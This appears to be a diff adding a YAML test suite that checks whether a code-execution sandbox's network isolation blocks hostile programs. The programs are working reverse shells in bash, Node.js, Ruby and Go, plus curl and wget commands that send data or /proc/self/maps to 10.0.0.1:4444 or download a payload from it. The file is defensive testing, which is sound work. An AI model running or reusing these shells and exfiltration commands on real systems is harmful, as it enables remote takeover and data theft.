@@ -1,0 +1,195 @@
+tests:
+  - name: "bash /dev/tcp reverse shell is blocked by network namespace"
+    requests:
+      - input:
+          runtime: bash
+          files:
+            - name: main.sh
+              type: plain
+              content: |
+                exec 5<>/dev/tcp/10.0.0.1/4444
+        output:
+          status: 200
+          body:
+            run:
+              stdout: ""
+              stderr: "/sandbox/main.sh: connect: Network is unreachable\n/sandbox/main.sh: line 1: /dev/tcp/10.0.0.1/4444: Network is unreachable\n"
+              output: "/sandbox/main.sh: connect: Network is unreachable\n/sandbox/main.sh: line 1: /dev/tcp/10.0.0.1/4444: Network is unreachable\n"
+              exit_code: 1
+              status: "OK"
+              signal: null
+
+  - name: "curl data exfiltration is blocked by network namespace"
+    requests:
+      - input:
+          runtime: bash
+          files:
+            - name: main.sh
+              type: plain
+              content: |
+                curl -sS http://10.0.0.1:4444/ -d "stolen_data=secret"
+        output:
+          status: 200
+          body:
+            run:
+              stdout: ""
+              stderr: "/^curl: \\(7\\) Failed to connect to 10\\.0\\.0\\.1 port 4444 after \\d+ ms: Couldn't connect to server\\n$/"
+              output: "/^curl: \\(7\\) Failed to connect to 10\\.0\\.0\\.1 port 4444 after \\d+ ms: Couldn't connect to server\\n$/"
+              exit_code: 7
+              status: "OK"
+              signal: null
+
+  - name: "wget download of malicious payload is blocked by network namespace"
+    requests:
+      - input:
+          runtime: bash
+          files:
+            - name: main.sh
+              type: plain
+              content: |
+                wget http://10.0.0.1:4444/malware -O /tmp/payload
+        output:
+          status: 200
+          body:
+            run:
+              stdout: ""
+              stderr: "/^--[^\n]+\nConnecting to 10\\.0\\.0\\.1:4444\\.\\.\\. failed: Network is unreachable\\.\n$/"
+              output: "/^--[^\n]+\nConnecting to 10\\.0\\.0\\.1:4444\\.\\.\\. failed: Network is unreachable\\.\n$/"
+              exit_code: 4
+              status: "OK"
+              signal: null
+
+  - name: "Node.js TCP reverse shell is blocked by network namespace"
+    requests:
+      - input:
+          runtime: node
+          files:
+            - name: index.js
+              type: plain
+              content: |
+                const net = require("net");
+                const cp = require("child_process");
+                const socket = new net.Socket();
+                socket.connect(4444, "10.0.0.1", () => {
+                  const sh = cp.spawn("/bin/bash", ["-i"]);
+                  sh.stdin.pipe(socket);
+                  socket.pipe(sh.stdout);
+                });
+        output:
+          status: 200
+          body:
+            run:
+              stdout: ""
+              stderr: "node:events:486\n      throw er; // Unhandled 'error' event\n      ^\n\nError: connect ENETUNREACH 10.0.0.1:4444 - Local (0.0.0.0:0)\n    at internalConnect (node:net:1110:16)\n    at defaultTriggerAsyncIdScope (node:internal/async_hooks:472:18)\n    at node:net:1364:9\n    at process.processTicksAndRejections (node:internal/process/task_queues:85:11)\nEmitted 'error' event on Socket instance at:\n    at emitErrorNT (node:internal/streams/destroy:170:8)\n    at emitErrorCloseNT (node:internal/streams/destroy:129:3)\n    at process.processTicksAndRejections (node:internal/process/task_queues:90:21) {\n  errno: -101,\n  code: 'ENETUNREACH',\n  syscall: 'connect',\n  address: '10.0.0.1',\n  port: 4444\n}\n\nNode.js v24.14.0\n"
+              output: "node:events:486\n      throw er; // Unhandled 'error' event\n      ^\n\nError: connect ENETUNREACH 10.0.0.1:4444 - Local (0.0.0.0:0)\n    at internalConnect (node:net:1110:16)\n    at defaultTriggerAsyncIdScope (node:internal/async_hooks:472:18)\n    at node:net:1364:9\n    at process.processTicksAndRejections (node:internal/process/task_queues:85:11)\nEmitted 'error' event on Socket instance at:\n    at emitErrorNT (node:internal/streams/destroy:170:8)\n    at emitErrorCloseNT (node:internal/streams/destroy:129:3)\n    at process.processTicksAndRejections (node:internal/process/task_queues:90:21) {\n  errno: -101,\n  code: 'ENETUNREACH',\n  syscall: 'connect',\n  address: '10.0.0.1',\n  port: 4444\n}\n\nNode.js v24.14.0\n"
+              exit_code: 1
+              status: "OK"
+              signal: null
+
+  - name: "Ruby TCP reverse shell is blocked by network namespace"
+    requests:
+      - input:
+          runtime: ruby
+          files:
+            - name: main.rb
+              type: plain
+              content: |
+                require 'socket'
+                s = TCPSocket.new("10.0.0.1", 4444)
+                exec("/bin/bash -i <&#{s.fileno} >&#{s.fileno} 2>&#{s.fileno}")
+        output:
+          status: 200
+          body:
+            run:
+              stdout: ""
+              stderr: "/sandbox/main.rb:2:in 'TCPSocket#initialize': Network is unreachable - connect(2) for \"10.0.0.1\" port 4444 (Errno::ENETUNREACH)\n\tfrom /sandbox/main.rb:2:in 'IO.new'\n\tfrom /sandbox/main.rb:2:in '<main>'\n"
+              output: "/sandbox/main.rb:2:in 'TCPSocket#initialize': Network is unreachable - connect(2) for \"10.0.0.1\" port 4444 (Errno::ENETUNREACH)\n\tfrom /sandbox/main.rb:2:in 'IO.new'\n\tfrom /sandbox/main.rb:2:in '<main>'\n"
+              exit_code: 1
+              status: "OK"
+              signal: null
+
+  - name: "Go TCP reverse shell is blocked by network namespace"
+    requests:
+      - input:
+          runtime: go
+          files:
+            - name: main.go
+              type: plain
+              content: |
+                package main
+
+                import (
+                	"net"
+                	"os"
+                	"os/exec"
+                )
+
+                func main() {
+                	conn, err := net.Dial("tcp", "10.0.0.1:4444")
+                	if err != nil {
+                		os.Stderr.WriteString(err.Error() + "\n")
+                		os.Exit(1)
+                	}
+                	cmd := exec.Command("/bin/bash", "-i")
+                	cmd.Stdin = conn
+                	cmd.Stdout = conn
+                	cmd.Stderr = conn
+                	cmd.Run()
+                }
+        output:
+          status: 200
+          body:
+            compile:
+              stdout: ""
+              stderr: ""
+              output: ""
+              exit_code: 0
+              status: "OK"
+              signal: null
+            run:
+              stdout: ""
+              stderr: "dial tcp 10.0.0.1:4444: connect: network is unreachable\n"
+              output: "dial tcp 10.0.0.1:4444: connect: network is unreachable\n"
+              exit_code: 1
+              status: "OK"
+              signal: null
+
+  - name: "curl exfiltration of /proc/self/maps to external server"
+    requests:
+      - input:
+          runtime: bash
+          files:
+            - name: main.sh
+              type: plain
+              content: |
+                curl -sS http://10.0.0.1:4444/ -d @/proc/self/maps
+        output:
+          status: 200
+          body:
+            run:
+              stdout: ""
+              stderr: "/^curl: \\(7\\) Failed to connect to 10\\.0\\.0\\.1 port 4444 after \\d+ ms: Couldn't connect to server\\n$/"
+              output: "/^curl: \\(7\\) Failed to connect to 10\\.0\\.0\\.1 port 4444 after \\d+ ms: Couldn't connect to server\\n$/"
+              exit_code: 7
+              status: "OK"
+              signal: null
+
+  - name: "bash reverse shell to IPv6 address is blocked"
+    requests:
+      - input:
+          runtime: bash
+          files:
+            - name: main.sh
+              type: plain
+              content: |
+                exec 5<>/dev/tcp/::1/4444
+        output:
+          status: 200
+          body:
+            run:
+              stdout: ""
+              stderr: "/sandbox/main.sh: connect: Cannot assign requested address\n/sandbox/main.sh: line 1: /dev/tcp/::1/4444: Cannot assign requested address\n"
+              output: "/sandbox/main.sh: connect: Cannot assign requested address\n/sandbox/main.sh: line 1: /dev/tcp/::1/4444: Cannot assign requested address\n"
+              exit_code: 1
+              status: "OK"
+              signal: null
